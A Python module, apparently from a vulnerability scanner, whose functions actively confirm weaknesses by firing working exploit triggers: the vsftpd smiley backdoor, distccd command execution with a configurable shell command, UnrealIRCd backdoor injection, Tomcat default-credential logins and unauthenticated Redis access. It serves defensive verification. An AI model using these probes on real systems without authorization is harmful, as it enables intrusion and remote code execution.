from __future__ import annotations

import asyncio
import secrets
import struct
from typing import Any

import httpx

from app.verifiers.base import VerificationContext, VerificationResult

_MARKER = "SA_ACTIVE_VERIFY_OK"


async def verify_vsftpd_smiley_backdoor(context: VerificationContext) -> VerificationResult:
    port = int(context.port.port)
    writer: asyncio.StreamWriter | None = None
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(str(context.asset.ip), port),
            timeout=context.connect_timeout_seconds,
        )
        banner = await _read_line(reader, timeout=context.read_timeout_seconds)
        writer.write(b"USER codex:)\r\n")
        await writer.drain()
        user_response = await _read_line(reader, timeout=context.read_timeout_seconds)
        writer.write(b"PASS codex\r\n")
        await writer.drain()
        pass_response = await _read_line(reader, timeout=context.read_timeout_seconds)
    except asyncio.TimeoutError:
        return _result("vsftpd_smiley_backdoor", "error", "vsftpd 后门探测超时")
    except Exception as exc:
        return _result("vsftpd_smiley_backdoor", "error", f"vsftpd 后门探测失败：{exc}")
    finally:
        await _close_writer(writer)

    backdoor_reader: asyncio.StreamReader | None = None
    backdoor_writer: asyncio.StreamWriter | None = None
    try:
        backdoor_reader, backdoor_writer = await asyncio.wait_for(
            asyncio.open_connection(str(context.asset.ip), 6200),
            timeout=context.connect_timeout_seconds,
        )
        prompt = await asyncio.wait_for(backdoor_reader.read(128), timeout=context.read_timeout_seconds)
        return _result(
            "vsftpd_smiley_backdoor",
            "confirmed",
            "触发 smiley 用户名后 6200 端口可连接，符合 vsftpd 后门特征",
            {
                "trigger_port": port,
                "backdoor_port": 6200,
                "banner": banner,
                "user_response": user_response,
                "pass_response": pass_response,
                "prompt_sample": prompt.decode("utf-8", errors="ignore").strip(),
            },
        )
    except asyncio.TimeoutError:
        return _result("vsftpd_smiley_backdoor", "inconclusive", "6200 端口建立连接后读取超时")
    except ConnectionRefusedError:
        return _result("vsftpd_smiley_backdoor", "rejected", "触发后未发现 6200 后门端口")
    except Exception as exc:
        return _result("vsftpd_smiley_backdoor", "inconclusive", f"6200 端口验证未成功：{exc}")
    finally:
        await _close_writer(backdoor_writer)


async def verify_ftp_anonymous_login(context: VerificationContext) -> VerificationResult:
    port = int(context.port.port)
    writer: asyncio.StreamWriter | None = None
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(str(context.asset.ip), port),
            timeout=context.connect_timeout_seconds,
        )
        banner = await _read_line(reader, timeout=context.read_timeout_seconds)
        writer.write(b"USER anonymous\r\n")
        await writer.drain()
        user_response = await _read_line(reader, timeout=context.read_timeout_seconds)
        writer.write(b"PASS anonymous@sa.local\r\n")
        await writer.drain()
        pass_response = await _read_line(reader, timeout=context.read_timeout_seconds)
        writer.write(b"QUIT\r\n")
        await writer.drain()
        if pass_response.startswith("230"):
            return _result(
                "ftp_anonymous_login",
                "confirmed",
                "FTP 匿名登录成功",
                {
                    "banner": banner,
                    "user_response": user_response,
                    "pass_response": pass_response,
                },
            )
        if pass_response.startswith("530"):
            return _result(
                "ftp_anonymous_login",
                "rejected",
                "FTP 匿名登录被拒绝",
                {
                    "banner": banner,
                    "user_response": user_response,
                    "pass_response": pass_response,
                },
            )
        return _result(
            "ftp_anonymous_login",
            "inconclusive",
            "FTP 返回了非预期的认证响应",
            {
                "banner": banner,
                "user_response": user_response,
                "pass_response": pass_response,
            },
        )
    except asyncio.TimeoutError:
        return _result("ftp_anonymous_login", "error", "FTP 匿名登录探测超时")
    except Exception as exc:
        return _result("ftp_anonymous_login", "error", f"FTP 匿名登录探测失败：{exc}")
    finally:
        await _close_writer(writer)


async def verify_tomcat_manager_default_creds(context: VerificationContext) -> VerificationResult:
    port = int(context.port.port)
    scheme = _resolve_http_scheme(context)
    host = str(context.asset.ip)
    active_check = context.rule.active_check
    params = active_check.params if active_check else {}
    credentials = _normalize_credentials(params.get("credentials"))
    paths = _normalize_paths(params.get("paths"))

    timeout = httpx.Timeout(
        connect=float(context.connect_timeout_seconds),
        read=float(context.read_timeout_seconds),
        write=float(context.read_timeout_seconds),
        pool=float(context.connect_timeout_seconds),
    )
    async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=False) as client:
        for credential in credentials:
            for path in paths:
                url = f"{scheme}://{host}:{port}{path}"
                try:
                    response = await client.get(
                        url,
                        auth=httpx.BasicAuth(credential["username"], credential["password"]),
                    )
                except httpx.TimeoutException:
                    return _result("tomcat_manager_default_creds", "error", "Tomcat 管理后台探测超时")
                except httpx.HTTPError as exc:
                    return _result("tomcat_manager_default_creds", "error", f"Tomcat 管理后台探测失败：{exc}")

                body_text = response.text[:512]
                location = response.headers.get("location", "")
                if response.status_code in {200, 302} and _looks_like_tomcat_manager(body_text, location):
                    return _result(
                        "tomcat_manager_default_creds",
                        "confirmed",
                        "Tomcat 管理后台默认凭据可用",
                        {
                            "url": url,
                            "status_code": response.status_code,
                            "username": credential["username"],
                            "password": credential["password"],
                            "location": location,
                        },
                    )
        return _result("tomcat_manager_default_creds", "rejected", "未发现可用的 Tomcat 管理后台默认凭据")


async def verify_distccd_rce_probe(context: VerificationContext) -> VerificationResult:
    port = int(context.port.port)
    marker = _marker()
    command = str((context.rule.active_check.params if context.rule.active_check else {}).get("command") or f"echo {marker}")
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(str(context.asset.ip), port),
            timeout=context.connect_timeout_seconds,
        )
        try:
            payload = _build_distccd_payload(command)
            writer.write(struct.pack(">I", len(payload)) + payload.encode("utf-8"))
            await writer.drain()
            response = await asyncio.wait_for(reader.read(4096), timeout=context.read_timeout_seconds)
        finally:
            await _close_writer(writer)
    except asyncio.TimeoutError:
        return _result("distccd_rce_probe", "error", "distccd 探测超时")
    except Exception as exc:
        return _result("distccd_rce_probe", "error", f"distccd 探测失败：{exc}")

    body = response.decode("utf-8", errors="ignore")
    if marker in body:
        return _result(
            "distccd_rce_probe",
            "confirmed",
            "distccd 返回了无害 marker，符合远程命令执行特征",
            {"marker": marker, "response_sample": body[:512]},
        )
    if body.strip():
        return _result("distccd_rce_probe", "inconclusive", "distccd 返回了响应，但未命中 marker", {"response_sample": body[:512]})
    return _result("distccd_rce_probe", "rejected", "distccd 未返回 marker")


async def verify_unrealircd_backdoor_probe(context: VerificationContext) -> VerificationResult:
    port = int(context.port.port)
    marker = _marker()
    writer: asyncio.StreamWriter | None = None
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(str(context.asset.ip), port),
            timeout=context.connect_timeout_seconds,
        )
        banner = await asyncio.wait_for(reader.read(512), timeout=context.read_timeout_seconds)
        payload = f"AB;echo {marker}\n".encode("utf-8")
        writer.write(payload)
        await writer.drain()
        response = await asyncio.wait_for(reader.read(2048), timeout=context.read_timeout_seconds)
    except asyncio.TimeoutError:
        return _result("unrealircd_backdoor_probe", "error", "UnrealIRCd 探测超时")
    except Exception as exc:
        return _result("unrealircd_backdoor_probe", "error", f"UnrealIRCd 探测失败：{exc}")
    finally:
        await _close_writer(writer)

    response_text = response.decode("utf-8", errors="ignore")
    if marker in response_text:
        return _result(
            "unrealircd_backdoor_probe",
            "confirmed",
            "UnrealIRCd 返回了无害 marker，符合后门特征",
            {
                "banner": banner.decode("utf-8", errors="ignore").strip(),
                "response_sample": response_text[:512],
                "marker": marker,
            },
        )
    if response_text.strip():
        return _result(
            "unrealircd_backdoor_probe",
            "inconclusive",
            "UnrealIRCd 返回了响应，但未命中 marker",
            {
                "banner": banner.decode("utf-8", errors="ignore").strip(),
                "response_sample": response_text[:512],
            },
        )
    return _result("unrealircd_backdoor_probe", "rejected", "UnrealIRCd 未返回 marker")


async def verify_redis_unauth_info_probe(context: VerificationContext) -> VerificationResult:
    port = int(context.port.port)
    writer: asyncio.StreamWriter | None = None
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(str(context.asset.ip), port),
            timeout=context.connect_timeout_seconds,
        )
        writer.write(_redis_command("PING"))
        await writer.drain()
        ping_response = await _read_redis_reply(reader, timeout=context.read_timeout_seconds)
        if ping_response.startswith("-NOAUTH"):
            return _result(
                "redis_unauth_info_probe",
                "rejected",
                "Redis 未授权探测被认证要求拒绝",
                {"ping_response": ping_response},
            )

        writer.write(_redis_command("INFO"))
        await writer.drain()
        info_response = await _read_redis_reply(reader, timeout=context.read_timeout_seconds)
    except asyncio.TimeoutError:
        return _result("redis_unauth_info_probe", "error", "Redis 未授权 INFO 探测超时")
    except Exception as exc:
        return _result("redis_unauth_info_probe", "error", f"Redis 未授权 INFO 探测失败：{exc}")
    finally:
        await _close_writer(writer)

    if info_response.startswith("-NOAUTH"):
        return _result(
            "redis_unauth_info_probe",
            "rejected",
            "Redis INFO 请求需要认证",
            {"ping_response": ping_response, "info_response": info_response},
        )

    if ping_response.startswith("+PONG") and ("redis_version:" in info_response or info_response.startswith("$")):
        return _result(
            "redis_unauth_info_probe",
            "confirmed",
            "Redis 在未认证情况下返回了 PING/INFO 响应",
            {
                "ping_response": ping_response,
                "info_response_sample": info_response[:512],
            },
        )

    if info_response.strip():
        return _result(
            "redis_unauth_info_probe",
            "inconclusive",
            "Redis 返回了响应，但未形成明确未授权 INFO 证据",
            {
                "ping_response": ping_response,
                "info_response_sample": info_response[:512],
            },
        )

    return _result("redis_unauth_info_probe", "rejected", "Redis 未返回可确认的未授权 INFO 响应")


async def verify_http_risky_methods_probe(context: VerificationContext) -> VerificationResult:
    port = int(context.port.port)
    scheme = _resolve_http_scheme(context)
    host = str(context.asset.ip)
    params = context.rule.active_check.params if context.rule.active_check else {}
    path = str(params.get("path") or "/").strip() or "/"
    if not path.startswith("/"):
        path = f"/{path}"

    timeout = httpx.Timeout(
        connect=float(context.connect_timeout_seconds),
        read=float(context.read_timeout_seconds),
        write=float(context.read_timeout_seconds),
        pool=float(context.connect_timeout_seconds),
    )
    url = f"{scheme}://{host}:{port}{path}"
    try:
        async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=False) as client:
            options_response = await client.options(url)
            allowed_methods = _extract_allowed_http_methods(options_response)
            risky_methods = sorted(method for method in allowed_methods if method in {"PUT", "DELETE", "PROPFIND"})
            if risky_methods:
                return _result(
                    "http_risky_methods_probe",
                    "confirmed",
                    f"HTTP 服务暴露风险方法：{', '.join(risky_methods)}",
                    {
                        "url": url,
                        "options_status_code": options_response.status_code,
                        "allowed_methods": sorted(allowed_methods),
                        "confirmed_methods": risky_methods,
                    },
                )

            propfind_response = await client.request("PROPFIND", url, headers={"Depth": "0"})
    except httpx.TimeoutException:
        return _result("http_risky_methods_probe", "error", "HTTP 风险方法探测超时")
    except httpx.HTTPError as exc:
        return _result("http_risky_methods_probe", "error", f"HTTP 风险方法探测失败：{exc}")

    if propfind_response.status_code in {200, 207, 401, 403}:
        return _result(
            "http_risky_methods_probe",
            "confirmed",
            "HTTP 服务接受 PROPFIND，请求方法暴露可确认",
            {
                "url": url,
                "options_status_code": options_response.status_code,
                "allowed_methods": sorted(allowed_methods),
                "propfind_status_code": propfind_response.status_code,
                "confirmed_methods": ["PROPFIND"],
            },
        )

    return _result(
        "http_risky_methods_probe",
        "rejected",
        "HTTP 服务未确认暴露 PUT/DELETE/PROPFIND 风险方法",
        {
            "url": url,
            "options_status_code": options_response.status_code,
            "allowed_methods": sorted(allowed_methods),
            "propfind_status_code": propfind_response.status_code,
        },
    )


def _result(detector: str, status: str, summary: str, evidence: dict[str, Any] | None = None) -> VerificationResult:
    return VerificationResult(
        status=status,
        summary=summary,
        detector=detector,
        evidence=evidence or {},
    )


def _resolve_http_scheme(context: VerificationContext) -> str:
    if context.service_name == "https":
        return "https"
    if int(context.port.port) in {443, 8443}:
        return "https"
    return "http"


def _normalize_credentials(raw: Any) -> list[dict[str, str]]:
    if isinstance(raw, list):
        normalized: list[dict[str, str]] = []
        for item in raw:
            if not isinstance(item, dict):
                continue
            username = str(item.get("username") or "").strip()
            password = str(item.get("password") or "").strip()
            if username and password:
                normalized.append({"username": username, "password": password})
        if normalized:
            return normalized
    return [{"username": "tomcat", "password": "tomcat"}]


def _normalize_paths(raw: Any) -> list[str]:
    if isinstance(raw, list):
        normalized = [str(item).strip() for item in raw if str(item).strip()]
        if normalized:
            return [item if item.startswith("/") else f"/{item}" for item in normalized]
    return ["/manager/html", "/manager/status"]


def _looks_like_tomcat_manager(body: str, location: str) -> bool:
    lowered_body = body.lower()
    lowered_location = location.lower()
    return any(
        token in lowered_body or token in lowered_location
        for token in ["tomcat web application manager", "/manager", "manager application", "apache tomcat"]
    )


def _build_distccd_payload(command: str) -> str:
    dist_cmd = (
        "DIST00000001ARGV00000002sh"
        "ARGV00000002-c"
        f"ARGV{len(command):08x}{command}"
        "ARGV00000001#"
    )
    source_token = secrets.token_hex(5)
    return (
        "DIST00000001"
        f"ARGC{3:08x}"
        f"ARGV{len(dist_cmd):08x}{dist_cmd}"
        f"DOTI{len(source_token):08x}{source_token}"
    )


def _marker() -> str:
    return f"{_MARKER}_{secrets.token_hex(4)}"


def _redis_command(*parts: str) -> bytes:
    payload = [f"*{len(parts)}\r\n".encode("utf-8")]
    for part in parts:
        encoded = part.encode("utf-8")
        payload.append(f"${len(encoded)}\r\n".encode("utf-8"))
        payload.append(encoded + b"\r\n")
    return b"".join(payload)


def _extract_allowed_http_methods(response: httpx.Response) -> set[str]:
    methods: set[str] = set()
    for header_name in ("allow", "public"):
        raw = response.headers.get(header_name, "")
        if not raw:
            continue
        for method in raw.split(","):
            normalized = method.strip().upper()
            if normalized:
                methods.add(normalized)
    return methods


async def _read_line(reader: asyncio.StreamReader, *, timeout: int) -> str:
    raw = await asyncio.wait_for(reader.readline(), timeout=timeout)
    return raw.decode("utf-8", errors="ignore").strip()


async def _read_redis_reply(reader: asyncio.StreamReader, *, timeout: int) -> str:
    first_line = await _read_line(reader, timeout=timeout)
    if not first_line:
        return ""
    if first_line.startswith("$"):
        try:
            payload_length = int(first_line[1:])
        except ValueError:
            return first_line
        if payload_length < 0:
            return first_line
        raw = await asyncio.wait_for(reader.readexactly(payload_length + 2), timeout=timeout)
        return f"{first_line}\n{raw.decode('utf-8', errors='ignore').rstrip()}"
    return first_line


async def _close_writer(writer: asyncio.StreamWriter | None) -> None:
    if writer is None:
        return
    writer.close()
    try:
        await writer.wait_closed()
    except Exception:
        return
